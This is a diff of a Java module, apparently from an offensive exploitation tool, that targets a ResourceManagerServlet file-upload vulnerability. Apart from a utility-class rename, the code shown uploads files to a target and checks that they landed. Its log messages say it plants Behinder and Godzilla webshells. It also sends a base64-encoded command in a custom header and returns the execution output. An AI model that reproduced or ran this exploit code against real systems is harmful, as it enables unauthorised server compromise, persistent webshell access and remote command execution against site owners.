@@ -6,7 +6,7 @@ import com.chave.config.Config;
 import com.chave.config.Mod;
 import com.chave.gadget.chain.CommonsCollections6_Array;
 import com.chave.proxy.HttpProxy;
-import com.chave.utils.HttpUtil;
+import com.chave.utils.MyHttpUtil;
 import com.chave.utils.SSLUtil;
 import com.chave.utils.Util;
 import javafx.scene.control.TextArea;
@@ -84,15 +84,15 @@ public class ResourceManagerServlet_Upload extends VulnBase {
             HttpURLConnection conn1 = (HttpURLConnection) apiUrl.openConnection();
 
             // 设置超时
-            HttpUtil.setTimeout(conn1);
+            MyHttpUtil.setTimeout(conn1);
 
             // 设置请求头
             conn1.setRequestProperty("Content-Type", "multipart/form-data");
             conn1.setRequestProperty("Content-Length", String.valueOf(postData.length));
 
-            HttpUtil.post(conn1, postData);
+            MyHttpUtil.post(conn1, postData);
 
-            int responseCode1 = HttpUtil.getResponseCode(conn1);
+            int responseCode1 = MyHttpUtil.getResponseCode(conn1);
 
             if (responseCode1 == HttpURLConnection.HTTP_OK) {
                 URL fileUrl = new URL(Config.TARGET + "/" + filename);
@@ -100,13 +100,13 @@ public class ResourceManagerServlet_Upload extends VulnBase {
                 HttpURLConnection conn2 = (HttpURLConnection) fileUrl.openConnection();
 
                 // 设置超时
-                HttpUtil.setTimeout(conn2);
+                MyHttpUtil.setTimeout(conn2);
 
                 // 检测上传文件是否存在
                 try {
-                    HttpUtil.get(conn2);
-                    int responseCode2 = HttpUtil.getResponseCode(conn2);
-                    String responseText2 = HttpUtil.getResponseText(conn2);
+                    MyHttpUtil.get(conn2);
+                    int responseCode2 = MyHttpUtil.getResponseCode(conn2);
+                    String responseText2 = MyHttpUtil.getResponseText(conn2);
                     if (responseCode2 == HttpURLConnection.HTTP_OK && responseText2.contains(pocFlag)) {
                         logMessage("[+] ResourceManagerServlet 文件上传漏洞存在! 成功上传测试文件: " + fileUrl);
                         return;
@@ -156,15 +156,15 @@ public class ResourceManagerServlet_Upload extends VulnBase {
             HttpURLConnection conn1 = (HttpURLConnection) apiUrl.openConnection();
 
             // 设置超时
-            HttpUtil.setTimeout(conn1);
+            MyHttpUtil.setTimeout(conn1);
 
             // 设置请求头
             conn1.setRequestProperty("Content-Type", "multipart/form-data");
             conn1.setRequestProperty("Content-Length", String.valueOf(postData.length));
 
-            HttpUtil.post(conn1, postData);
+            MyHttpUtil.post(conn1, postData);
 
-            int responseCode1 = HttpUtil.getResponseCode(conn1);
+            int responseCode1 = MyHttpUtil.getResponseCode(conn1);
 
             if (responseCode1 == HttpURLConnection.HTTP_OK) {
                 URL fileUrl = new URL(Config.TARGET + "/" + filename);
@@ -172,13 +172,13 @@ public class ResourceManagerServlet_Upload extends VulnBase {
                 HttpURLConnection conn2 = (HttpURLConnection) fileUrl.openConnection();
 
                 // 设置超时
-                HttpUtil.setTimeout(conn2);
+                MyHttpUtil.setTimeout(conn2);
 
                 // 检测上传文件是否存在
                 try {
-                    HttpUtil.get(conn2);
-                    int responseCode2 = HttpUtil.getResponseCode(conn2);
-                    String responseText2 = HttpUtil.getResponseText(conn2);
+                    MyHttpUtil.get(conn2);
+                    int responseCode2 = MyHttpUtil.getResponseCode(conn2);
+                    String responseText2 = MyHttpUtil.getResponseText(conn2);
                     if (responseCode2 == HttpURLConnection.HTTP_OK && responseText2.contains(expFlag)) {
                         logMessage("[+] 文件上传成功! 同时写入回显/冰蝎/哥斯拉, 连接地址: " + fileUrl + "\n[+] 请求头与连接密码见 README.md.");
                         return;
@@ -219,19 +219,19 @@ public class ResourceManagerServlet_Upload extends VulnBase {
             HttpURLConnection exec_conn = (HttpURLConnection) apiUrl.openConnection();
 
             // 设置超时
-            HttpUtil.setTimeout(exec_conn);
+            MyHttpUtil.setTimeout(exec_conn);
 
             // 设置请求头
             exec_conn.setRequestProperty("Content-Type", "application/octet-stream");
             exec_conn.setRequestProperty("Content-Length", String.valueOf(baos.toByteArray().length));
             exec_conn.setRequestProperty("testzxcv4", pocFlag + Util.byteCodeToBase64(Config.CMD.getBytes()));
 
-            HttpUtil.post(exec_conn, baos.toByteArray());
+            MyHttpUtil.post(exec_conn, baos.toByteArray());
 
-            int responseCode = HttpUtil.getResponseCode(exec_conn);
+            int responseCode = MyHttpUtil.getResponseCode(exec_conn);
 
             if (responseCode == HttpURLConnection.HTTP_OK ) {
-                String responseText = HttpUtil.getResponseText(exec_conn);
+                String responseText = MyHttpUtil.getResponseText(exec_conn);
                 logExec("[+] 命令执行成功!\n" + responseText);
                 return;
             } else {
@@ -270,15 +270,15 @@ public class ResourceManagerServlet_Upload extends VulnBase {
             HttpURLConnection conn1 = (HttpURLConnection) apiUrl.openConnection();
 
             // 设置超时
-            HttpUtil.setTimeout(conn1);
+            MyHttpUtil.setTimeout(conn1);
 
             // 设置请求头
             conn1.setRequestProperty("Content-Type", "multipart/form-data");
             conn1.setRequestProperty("Content-Length", String.valueOf(postData.length));
 
-            HttpUtil.post(conn1, postData);
+            MyHttpUtil.post(conn1, postData);
 
-            int responseCode1 = HttpUtil.getResponseCode(conn1);
+            int responseCode1 = MyHttpUtil.getResponseCode(conn1);
 
             if (responseCode1 == HttpURLConnection.HTTP_OK) {
                 URL fileUrl = new URL(Config.TARGET + "/" + filename);
@@ -286,12 +286,12 @@ public class ResourceManagerServlet_Upload extends VulnBase {
                 HttpURLConnection conn2 = (HttpURLConnection) fileUrl.openConnection();
 
                 // 设置超时
-                HttpUtil.setTimeout(conn2);
+                MyHttpUtil.setTimeout(conn2);
 
                 // 检测上传文件是否存在
                 try {
-                    HttpUtil.get(conn2);
-                    int responseCode2 = HttpUtil.getResponseCode(conn2);
+                    MyHttpUtil.get(conn2);
+                    int responseCode2 = MyHttpUtil.getResponseCode(conn2);
 
                     if (responseCode2 == HttpURLConnection.HTTP_OK) {
                         logUpload("[+] 文件上传成功, 文件地址: " + fileUrl);
